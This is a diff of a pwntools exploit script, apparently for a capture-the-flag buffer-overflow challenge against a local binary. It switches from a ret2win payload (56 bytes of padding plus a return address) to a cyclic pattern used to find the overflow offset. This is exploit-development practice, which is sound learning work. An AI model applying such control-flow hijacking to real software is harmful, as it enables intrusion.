@@ -6,19 +6,17 @@ context(os='linux', arch='amd64')
 
 padding_length = 56
 #ret_offset = -96
-winner_address = '0x401206'
+#winner_address = '0x401206'
 
 log.info('Create IO')
 #io = remote('', )
 io = process('/home/kali/Downloads/reg')
 
 
-#payload = cyclic(200)
+payload = cyclic(200)
 
-padding = b'A' * padding_length
-payload = padding + p64(winner_address)
-
-
+#padding = b'A' * padding_length
+#payload = padding + p64(winner_address)
 
 log.info('Send Payload')
 io.sendlineafter('name : ', payload)
